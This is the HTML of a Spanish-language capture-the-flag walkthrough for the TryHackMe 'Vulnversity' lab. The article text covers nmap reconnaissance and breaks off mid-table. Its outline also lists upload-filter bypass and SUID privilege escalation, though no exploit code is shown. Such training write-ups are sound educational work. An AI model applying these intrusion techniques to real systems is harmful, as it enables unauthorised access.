<!DOCTYPE html>
<html data-bs-theme="dark" lang="en"><head><meta charset="utf-8"/><meta content="ie=edge" http-equiv="x-ua-compatible"/><meta content="width=device-width,initial-scale=1" name="viewport"/><link as="font" crossorigin="" href="/fonts/vendor/jost/jost-v4-latin-regular.woff2" rel="preload" type="font/woff2"/><link as="font" crossorigin="" href="/fonts/vendor/jost/jost-v4-latin-500.woff2" rel="preload" type="font/woff2"/><link as="font" crossorigin="" href="/fonts/vendor/jost/jost-v4-latin-700.woff2" rel="preload" type="font/woff2"/><script integrity="sha256-7P5g8zUi2gCsrip8UZWuAjf2v3NtTClag3AL28tNAmM=" src="/js/dismissable-alert.ecfe60f33522da00acae2a7c5195ae0237f6bf736d4c295a83700bdbcb4d0263.js"></script><link crossorigin="anonymous" href="/main.e4109b20b4f89c4683fd4001628afc7b5c67c3c9fb9720b6cfb39711ba54cd402c8b5eff1d657629f2a52afa865c201b2cc7838f4e56d6748506a518e4111579.css" integrity="sha512-5BCbILT4nEaD/UABYor8e1xnw8n7lyC2z7OXEbpUzUAsi17/HWV2KfKlKvqGXCAbLMeDj05W1nSFBqUY5BEVeQ==" rel="stylesheet"/><noscript><style>img.lazyload{display:none}</style></noscript><link href="/writeups/tryhackme/vulnversity/" rel="canonical"/><title>Vulnversity | d3b0o</title><meta content="" name="description"/><meta content="Vulnversity" property="og:title"/><meta content="Aprende sobre el reconocimiento activo, los ataques a aplicaciones web y la escalada de privilegios.
https://tryhackme.com/room/vulnversity
IP Atacante = 10.10.10.10" property="og:description"/><meta content="article" property="og:type"/><meta content="/writeups/tryhackme/vulnversity/" property="og:url"/><meta content="writeups" property="article:section"/><meta content="2022-12-18T00:00:00+00:00" property="article:published_time"/><meta content="2022-12-18T00:00:00+00:00" property="article:modified_time"/><meta content="d3b0o" property="og:site_name"/><meta content="summary" name="twitter:card"/><meta content="Vulnversity" name="twitter:title"/><meta content="Aprende sobre el reconocimiento activo, los ataques a aplicaciones web y la escalada de privilegios.
https://tryhackme.com/room/vulnversity
IP Atacante = 10.10.10.10" name="twitter:description"/><meta content="@getdoks" name="twitter:site"/><script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"/","name":"D3b0o","position":1},{"@type":"ListItem","item":"/writeups/","name":"Writeups","position":2},{"@type":"ListItem","item":"/writeups/tryhackme/","name":"Try Hack Me","position":3},{"@type":"ListItem","name":"Vulnversity","position":4}]}</script></head><body class="single section writeups" data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll="true" data-bs-spy="scroll" data-bs-target="#toc" tabindex="0"><div class="alert alert-primary alert-dismissible fade show text-center" data-id="global-alert-ed321576fabf52d76f925272710cb364" id="announcement" role="alert"><span class="alert-text">¡Nuevo writeup de la máquina "<a href="/writeups/hackthebox/enterprise">Enterprise</a>" de HackTheBox!</span>
<button aria-label="Close" class="btn-close" data-bs-dismiss="alert" type="button"></button></div><div class="sticky-top"><div class="header-bar"></div><header class="navbar navbar-expand-lg"><div class="container-lg"><a class="navbar-brand me-auto me-lg-3" href="/">d3b0o</a>
<button aria-label="Search website" class="btn btn-link nav-link mx-2 d-lg-none" id="searchToggleMobile" type="button"><svg class="icon icon-tabler icon-tabler-search" fill="none" height="24" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none" stroke="none"></path><circle cx="10" cy="10" r="7"></circle><line x1="21" x2="15" y1="21" y2="15"></line></svg></button>
<button aria-controls="offcanvasNavSection" aria-label="Open section navigation menu" class="btn btn-link d-lg-none" data-bs-target="#offcanvasNavSection" data-bs-toggle="offcanvas" type="button"><svg class="icon icon-tabler icon-tabler-dots-vertical" fill="none" height="24" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none" stroke="none"></path><path d="M12 12m-1 0a1 1 0 102 0 1 1 0 10-2 0"></path><path d="M12 19m-1 0a1 1 0 102 0 1 1 0 10-2 0"></path><path d="M12 5m-1 0a1 1 0 102 0 1 1 0 10-2 0"></path></svg></button><div aria-labelledby="offcanvasNavSectionLabel" class="offcanvas offcanvas-start d-lg-none" id="offcanvasNavSection" tabindex="-1"><div class="header-bar"></div><div class="offcanvas-header"><h5 class="offcanvas-title" id="offcanvasNavSectionLabel">Writeups</h5><button aria-label="Close" class="btn btn-link nav-link p-0" data-bs-dismiss="offcanvas" type="button"><svg class="icon icon-tabler icon-tabler-x" fill="none" height="24" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none" stroke="none"></path><path d="M18 6 6 18"></path><path d="M6 6l12 12"></path></svg></button></div><div class="offcanvas-body"><aside class="doks-sidebar mt-n3"><nav aria-label="Tertiary navigation" id="doks-docs-nav"><ul class="list-unstyled collapsible-sidebar"><li class="mb-1"><button aria-expanded="false" class="btn btn-toggle align-items-center rounded collapsed" data-bs-target="#section-1cad35d4b3b9f624f82dbf237daaf188" data-bs-toggle="collapse">
Intro</button><div class="collapse" id="section-1cad35d4b3b9f624f82dbf237daaf188"><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href="/writeups/intro/bienvenido/">Bienvenido</a></li></ul></div></li><li class="mb-1"><button aria-expanded="false" class="btn btn-toggle align-items-center rounded collapsed" data-bs-target="#section-d9fb08be3ed131369df5d4aa808dac70" data-bs-toggle="collapse">
HackTheBox</button><div class="collapse" id="section-d9fb08be3ed131369df5d4aa808dac70"><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href="/writeups/hackthebox/enterprise/">Enterprise</a></li><li><a class="docs-link rounded" href="/writeups/hackthebox/jupiter/">Jupiter</a></li><li><a class="docs-link rounded" href="/writeups/hackthebox/toolbox/">Toolbox</a></li><li><a class="docs-link rounded" href="/writeups/hackthebox/pandora-video/">Pandora (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackthebox/horizontall-video/">Horizontall (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackthebox/bashed-video/">Bashed (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackthebox/blue/">Blue</a></li></ul></div></li><li class="mb-1"><button aria-expanded="true" class="btn btn-toggle align-items-center rounded collapsed" data-bs-target="#section-3e74cf5d3d91ad9d67cc0e52e7daf92a" data-bs-toggle="collapse">
TryHackMe</button><div class="collapse show" id="section-3e74cf5d3d91ad9d67cc0e52e7daf92a"><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href="/writeups/tryhackme/blue/">Blue</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/chill-hack/">Chill Hack</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/team/">Team</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/startup/">Startup</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/source/">Source</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/mustacchio/">Mustacchio</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/wonderland/">Wonderland</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/bounty-hacker/">Bounty Hacker</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/overpass/">Overpass</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/develpy/">Develpy</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/tomghost/">Tomghost</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/wgel/">Wgel</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/gallery/">Gallery</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/mr.robot/">Mr.Robot</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/agent-t/">Agent T</a></li><li><a class="docs-link rounded active" href="/writeups/tryhackme/vulnversity/">Vulnversity</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/brooklyn-nine-nine/">Brooklyn Nine Nine</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/agent-sudo/">Agent sudo</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/lazy-admin/">Lazy admin</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/chocolate-factory/">Chocolate Factory</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/rootme/">RootMe</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/pickle-rick/">Pickle Rick</a></li></ul></div></li><li class="mb-1"><button aria-expanded="false" class="btn btn-toggle align-items-center rounded collapsed" data-bs-target="#section-899f9e1034ad8d41a30f4792e02699a8" data-bs-toggle="collapse">
HackMyVm</button><div class="collapse" id="section-899f9e1034ad8d41a30f4792e02699a8"><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href="/writeups/hackmyvm/friendly-iii-video/">Friendly III (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackmyvm/visions-video/">Visions (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackmyvm/friendly-ii-video/">Friendly II (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackmyvm/five-video/">Five (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackmyvm/doc-video/">Doc (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackmyvm/literal-video/">Literal (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackmyvm/jabita-video/">Jabita (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackmyvm/friendly-i-video/">Friendly I (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackmyvm/uvalde-video/">Uvalde (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackmyvm/w140-video/">W140 (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackmyvm/jabita/">Jabita</a></li></ul></div></li></ul></nav></aside></div></div><button aria-controls="offcanvasNavMain" aria-label="Open main navigation menu" class="btn btn-link nav-link mx-2 order-3 d-lg-none" data-bs-target="#offcanvasNavMain" data-bs-toggle="offcanvas" type="button"><svg class="icon icon-tabler icon-tabler-menu" fill="none" height="24" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none" stroke="none"></path><line x1="4" x2="20" y1="8" y2="8"></line><line x1="4" x2="20" y1="16" y2="16"></line></svg></button><div aria-labelledby="offcanvasNavMainLabel" class="offcanvas offcanvas-end h-auto" id="offcanvasNavMain" tabindex="-1"><div class="header-bar d-lg-none"></div><div class="offcanvas-header"><h5 class="offcanvas-title" id="offcanvasNavMainLabel">d3b0o</h5><button aria-label="Close" class="btn btn-link nav-link p-0" data-bs-dismiss="offcanvas" type="button"><svg class="icon icon-tabler icon-tabler-x" fill="none" height="24" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none" stroke="none"></path><path d="M18 6 6 18"></path><path d="M6 6l12 12"></path></svg></button></div><div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between"><ul class="navbar-nav flex-grow-1"><li class="nav-item"><a aria-current="true" class="nav-link active" href="/writeups/intro/bienvenido/">Writeups</a></li><li class="nav-item"><a class="nav-link" href="/blog/">Blog</a></li></ul><button aria-label="Search website" class="btn btn-link nav-link p-2 d-none d-lg-block" id="searchToggleDesktop" type="button"><svg class="icon icon-tabler icon-tabler-search" fill="none" height="24" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none" stroke="none"></path><circle cx="10" cy="10" r="7"></circle><line x1="21" x2="15" y1="21" y2="15"></line></svg></button><ul class="nav mx-auto flex-row order-lg-4" id="socialMenu"><li class="nav-item"><a class="nav-link social-link" href="https://x.com/sr_d3b0o"><svg class="icon icon-tabler icon-tabler-brand-x" fill="none" height="24" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none" stroke="none"></path><path d="M4 4l11.733 16H20L8.267 4z"></path><path d="M4 20l6.768-6.768m2.46-2.46L20 4"></path></svg><small class="ms-2 visually-hidden">Twitter</small></a></li><li class="nav-item"><a class="nav-link social-link" href="https://github.com/d3b0o"><svg class="icon icon-tabler icon-tabler-brand-github" fill="none" height="24" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none" stroke="none"></path><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"></path></svg><small class="ms-2 visually-hidden">GitHub</small></a></li></ul><a class="btn btn-primary rounded-pill mt-2 btn-block d-lg-none" href="https://www.buymeacoffee.com/d3b0o" role="button">Support</a></div></div><a class="btn btn-primary rounded-pill ms-3 me-2 px-4 order-lg-3 d-none d-lg-block" href="https://www.buymeacoffee.com/d3b0o" role="button">Support</a></div></header></div><div aria-hidden="true" aria-labelledby="searchModalLabel" class="modal" id="searchModal" tabindex="-1"><div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down"><div class="modal-content"><div class="modal-header"><h1 class="modal-title fs-5 visually-hidden" id="searchModalLabel">Search</h1><button aria-label="Close" class="btn-close visually-hidden" data-bs-dismiss="modal" type="button"></button><div class="search-input flex-grow-1 d-none"><form accept-charset="utf-8" action="#" class="search-form" id="search-form" method="post" role="search"><label class="visually-hidden" for="query">Search</label><div class="d-flex"><input aria-label="Search" autocomplete="off" class="search-text form-control form-control-lg" id="query" maxlength="128" name="query" placeholder="Search" type="search"/>
<button aria-label="Close" class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss="modal" type="button">Cancel</button></div></form></div></div><div class="modal-body"><p class="search-loading status message d-none mt-3 text-center">Loading search index…</p><p class="search-no-recent message d-none mt-3 text-center">No recent searches</p><p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class="query-no-results">Query here</span></strong>"</p><div class="search-results" id="searchResults"></div><template><article class="search-result list-view"><div class="card my-3"><div class="card-body"><header><h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href="#">Title here</a></h2><div class="submitted"><time class="created-date">Date here</time></div></header><div class="content d-none">Summary here</div></div></div></article></template></div><div class="modal-footer"><ul class="list-inline me-auto d-none d-md-block"><li class="list-inline-item"><kbd class="me-2"><svg aria-label="Enter key" height="15" role="img" width="15"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4m3 3-3-3 3-3"></path></g></svg></kbd><span class="DocSearch-Label">to select</span></li><li class="list-inline-item"><kbd class="me-2"><svg aria-label="Arrow down" height="15" role="img" width="15"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8m3-3-3 3-3-3"></path></g></svg></kbd><kbd class="me-2"><svg aria-label="Arrow up" height="15" role="img" width="15"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8m3 3-3-3-3 3"></path></g></svg></kbd><span class="DocSearch-Label">to navigate</span></li><li class="list-inline-item"><kbd class="me-2"><svg aria-label="Escape key" height="15" role="img" width="15"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993.0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016s1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5s-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864.0 1.6425 1.031 1.5443 2.2492h-2.956"></path></g></svg></kbd><span class="DocSearch-Label">to close</span></li></ul><p class="d-md-none">Search by <a class="text-decoration-none" href="https://github.com/nextapps-de/flexsearch">FlexSearch</a></p></div></div></div></div><div class="wrap container-lg" role="document"><div class="content"><div class="row flex-xl-nowrap"><div class="col-lg-5 col-xl-4 docs-sidebar docs-sidebar-offset d-none d-lg-block"><nav aria-label="Main navigation" class="docs-links"><ul class="list-unstyled collapsible-sidebar"><li class="mb-1"><button aria-expanded="false" class="btn btn-toggle align-items-center rounded collapsed" data-bs-target="#section-1cad35d4b3b9f624f82dbf237daaf188" data-bs-toggle="collapse">
Intro</button><div class="collapse" id="section-1cad35d4b3b9f624f82dbf237daaf188"><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href="/writeups/intro/bienvenido/">Bienvenido</a></li></ul></div></li><li class="mb-1"><button aria-expanded="false" class="btn btn-toggle align-items-center rounded collapsed" data-bs-target="#section-d9fb08be3ed131369df5d4aa808dac70" data-bs-toggle="collapse">
HackTheBox</button><div class="collapse" id="section-d9fb08be3ed131369df5d4aa808dac70"><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href="/writeups/hackthebox/enterprise/">Enterprise</a></li><li><a class="docs-link rounded" href="/writeups/hackthebox/jupiter/">Jupiter</a></li><li><a class="docs-link rounded" href="/writeups/hackthebox/toolbox/">Toolbox</a></li><li><a class="docs-link rounded" href="/writeups/hackthebox/pandora-video/">Pandora (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackthebox/horizontall-video/">Horizontall (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackthebox/bashed-video/">Bashed (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackthebox/blue/">Blue</a></li></ul></div></li><li class="mb-1"><button aria-expanded="true" class="btn btn-toggle align-items-center rounded collapsed" data-bs-target="#section-3e74cf5d3d91ad9d67cc0e52e7daf92a" data-bs-toggle="collapse">
TryHackMe</button><div class="collapse show" id="section-3e74cf5d3d91ad9d67cc0e52e7daf92a"><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href="/writeups/tryhackme/blue/">Blue</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/chill-hack/">Chill Hack</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/team/">Team</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/startup/">Startup</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/source/">Source</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/mustacchio/">Mustacchio</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/wonderland/">Wonderland</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/bounty-hacker/">Bounty Hacker</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/overpass/">Overpass</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/develpy/">Develpy</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/tomghost/">Tomghost</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/wgel/">Wgel</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/gallery/">Gallery</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/mr.robot/">Mr.Robot</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/agent-t/">Agent T</a></li><li><a class="docs-link rounded active" href="/writeups/tryhackme/vulnversity/">Vulnversity</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/brooklyn-nine-nine/">Brooklyn Nine Nine</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/agent-sudo/">Agent sudo</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/lazy-admin/">Lazy admin</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/chocolate-factory/">Chocolate Factory</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/rootme/">RootMe</a></li><li><a class="docs-link rounded" href="/writeups/tryhackme/pickle-rick/">Pickle Rick</a></li></ul></div></li><li class="mb-1"><button aria-expanded="false" class="btn btn-toggle align-items-center rounded collapsed" data-bs-target="#section-899f9e1034ad8d41a30f4792e02699a8" data-bs-toggle="collapse">
HackMyVm</button><div class="collapse" id="section-899f9e1034ad8d41a30f4792e02699a8"><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href="/writeups/hackmyvm/friendly-iii-video/">Friendly III (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackmyvm/visions-video/">Visions (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackmyvm/friendly-ii-video/">Friendly II (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackmyvm/five-video/">Five (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackmyvm/doc-video/">Doc (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackmyvm/literal-video/">Literal (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackmyvm/jabita-video/">Jabita (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackmyvm/friendly-i-video/">Friendly I (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackmyvm/uvalde-video/">Uvalde (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackmyvm/w140-video/">W140 (Video)</a></li><li><a class="docs-link rounded" href="/writeups/hackmyvm/jabita/">Jabita</a></li></ul></div></li></ul></nav></div><nav aria-label="Secondary navigation" class="docs-toc docs-toc-offset d-none d-xl-block col-xl-3"><div class="page-links"><h3>On this page</h3><nav id="toc"><ul><li><ul><li><a href="#reconocimiento">Reconocimiento</a><ul><li><a href="#escanea-la-máquina-cuántos-puertos-están-abiertos">Escanea la máquina, ¿cuántos puertos están abiertos?</a></li><li><a href="#qué-versión-del-proxy-se-está-ejecutando-en-la-máquina">¿Qué versión del proxy se está ejecutando en la máquina?</a></li><li><a href="#cuántos-puertos-escaneará-nmap-si-se-usó-la-bandera--p-400">¿Cuántos puertos escaneará nmap si se usó la bandera -p-400?</a></li><li><a href="#usando-el-indicador-nmap--n-qué-no-resolverá">Usando el indicador nmap -n, ¿qué no resolverá?</a></li><li><a href="#cuál-es-el-sistema-operativo-más-probable-que-esté-ejecutando-esta-máquina">¿Cuál es el sistema operativo más probable que esté ejecutando esta máquina?</a></li><li><a href="#en-qué-puerto-se-está-ejecutando-el-servidor-web">¿En qué puerto se está ejecutando el servidor web?</a></li></ul></li><li><a href="#localizando-subdirectorios">Localizando subdirectorios</a><ul><li><a href="#cuál-es-el-directorio-que-tiene-una-página-de-formulario-de-carga">¿Cuál es el directorio que tiene una página de formulario de carga?</a><ul><li><a href="#gobuster">GoBuster</a></li><li><a href="#wfuzz">wfuzz</a></li></ul></li></ul></li><li><a href="#comprometer-el-servidor-web">Comprometer el servidor web</a></li><li><a href="#qué-tipo-de-archivo-común-que-le-gustaría-cargar-para-explotar-el-servidor-está-bloqueado-prueba-un-par-para-averiguarlo">¿Qué tipo de archivo común, que le gustaría cargar para explotar el servidor, está bloqueado? Prueba un par para averiguarlo.</a><ul><li><a href="#qué-extensión-está-permitida">¿Qué extensión está permitida?</a></li><li><a href="#cuál-es-el-nombre-del-usuario-que-administra-el-servidor-web">¿Cuál es el nombre del usuario que administra el servidor web?</a></li></ul></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a><ul><li><a href="#en-el-sistema-busque-todos-los-archivos-suid-qué-archivo-se-destaca">En el sistema, busque todos los archivos SUID. ¿Qué archivo se destaca?</a></li><li><a href="#conviértase-en-root-y-obtenga-la-última-flag-rootroottxt">Conviértase en root y obtenga la última flag (/root/root.txt)</a></li></ul></li></ul></li></ul></nav></div></nav><main class="docs-content col-lg-11 col-xl-9"><nav aria-label="breadcrumb"><ol class="breadcrumb"><li class="breadcrumb-item"><a href="/">Home</a></li><li class="breadcrumb-item"><a href="/writeups/">Writeups</a></li><li class="breadcrumb-item"><a href="/writeups/tryhackme/">TryHackMe</a></li><li aria-current="page" class="breadcrumb-item active">Vulnversity</li></ol></nav><div style="display:flex;align-items:center"><div style="border-left:8px solid #4ca113;height:40px;margin-right:10px"></div><h1 style="margin:0;vertical-align:middle">Vulnversity</h1></div><nav aria-label="Quaternary navigation" class="toc-mobile d-xl-none"><details><summary>On this page</summary><div class="page-links"><nav id="TableOfContents"><ul><li><ul><li><a href="#reconocimiento">Reconocimiento</a><ul><li><a href="#escanea-la-máquina-cuántos-puertos-están-abiertos">Escanea la máquina, ¿cuántos puertos están abiertos?</a></li><li><a href="#qué-versión-del-proxy-se-está-ejecutando-en-la-máquina">¿Qué versión del proxy se está ejecutando en la máquina?</a></li><li><a href="#cuántos-puertos-escaneará-nmap-si-se-usó-la-bandera--p-400">¿Cuántos puertos escaneará nmap si se usó la bandera -p-400?</a></li><li><a href="#usando-el-indicador-nmap--n-qué-no-resolverá">Usando el indicador nmap -n, ¿qué no resolverá?</a></li><li><a href="#cuál-es-el-sistema-operativo-más-probable-que-esté-ejecutando-esta-máquina">¿Cuál es el sistema operativo más probable que esté ejecutando esta máquina?</a></li><li><a href="#en-qué-puerto-se-está-ejecutando-el-servidor-web">¿En qué puerto se está ejecutando el servidor web?</a></li></ul></li><li><a href="#localizando-subdirectorios">Localizando subdirectorios</a><ul><li><a href="#cuál-es-el-directorio-que-tiene-una-página-de-formulario-de-carga">¿Cuál es el directorio que tiene una página de formulario de carga?</a><ul><li><a href="#gobuster">GoBuster</a></li><li><a href="#wfuzz">wfuzz</a></li></ul></li></ul></li><li><a href="#comprometer-el-servidor-web">Comprometer el servidor web</a></li><li><a href="#qué-tipo-de-archivo-común-que-le-gustaría-cargar-para-explotar-el-servidor-está-bloqueado-prueba-un-par-para-averiguarlo">¿Qué tipo de archivo común, que le gustaría cargar para explotar el servidor, está bloqueado? Prueba un par para averiguarlo.</a><ul><li><a href="#qué-extensión-está-permitida">¿Qué extensión está permitida?</a></li><li><a href="#cuál-es-el-nombre-del-usuario-que-administra-el-servidor-web">¿Cuál es el nombre del usuario que administra el servidor web?</a></li></ul></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a><ul><li><a href="#en-el-sistema-busque-todos-los-archivos-suid-qué-archivo-se-destaca">En el sistema, busque todos los archivos SUID. ¿Qué archivo se destaca?</a></li><li><a href="#conviértase-en-root-y-obtenga-la-última-flag-rootroottxt">Conviértase en root y obtenga la última flag (/root/root.txt)</a></li></ul></li></ul></li></ul></nav></div></details></nav><div class="tag-list-single"><a class="btn btn-light" href="/tags/walkthroughs/" role="button">Walkthroughs</a>
<a class="btn btn-light" href="/tags/f%C3%A1cil/" role="button">Fácil</a>
<a class="btn btn-light" href="/tags/linux/" role="button">Linux</a></div><div style="display:flex;align-items:center;vertical-align:middle"><img alt="" src="/blog/phishing/images/pingu2.png" style="width:40px;height:40px;margin-right:10px;vertical-align:middle"/>
<img alt="" src="/blog/phishing/images/thm.png" style="width:40px;height:40px;margin-right:10px;vertical-align:middle"/></div><br/><p>Aprende sobre el reconocimiento activo, los ataques a aplicaciones web y la escalada de privilegios.</p><p>https://tryhackme.com/room/vulnversity</p><p>IP Atacante = 10.10.10.10</p><p>IP víctima = 10.10.23.174</p><h2 id="reconocimiento">Reconocimiento<a aria-hidden="true" class="anchor" href="#reconocimiento">#</a></h2><p>Para la fase de Reconocimiento vamos a usar nmap.</p><p>¿Qué es nmap?</p><p>nmap es una herramienta potente, gratuita y de código abierto que se utiliza para descubrir hosts y servicios en una red informática. En nuestro ejemplo, usamos nmap para escanear esta máquina e identificar todos los servicios que se ejecutan en un puerto en particular. nmap tiene muchas capacidades, a continuación hay una tabla que resume algunas de las funciones que proporciona.</p><p><img alt="nmap" class="img-fluid lazyload blur-up" data-sizes="auto" data-srcset="/writeups/tryhackme/vulnversity/images/unnamed_hu0dc3f27283eb59cc7b031c55d2dbe4d5_175923_fe25c7604d5b27659fa02f6a5eac27f0.webp 480w, /writeups/tryhackme/vulnversity/images/unnamed_hu0dc3f27283eb59cc7b031c55d2dbe4d5_175923_9080f9c702241858ed45ac82cc862aaf.webp 640w, /writeups/tryhackme/vulnversity/images/unnamed_hu0dc3f27283eb59cc7b031c55d2dbe4d5_175923_7c157aee8e0bd9b09a52f81026f2cfc3.webp 800w, /writeups/tryhackme/vulnversity/images/unnamed_hu0dc3f27283eb59cc7b031c55d2dbe4d5_175923_13fc6a6a48623980d7e065298ad12193.webp 1024w" fetchpriority="low" height="900" id="h-rh-i-0" src="/writeups/tryhackme/vulnversity/images/unnamed_hu0dc3f27283eb59cc7b031c55d2dbe4d5_175923_95c1aef2e9773a9e89d4cd0264a0c1d5.webp" width="1600"/></p><p>Parámetros típicos nmap:</p><table><thead><tr><th style="text-align:left">Parámetro</th><th>Función</th></tr></thead><tbody><tr><td style="text-align:left">-p-</td><td>Para que el escaneo sea a todos los 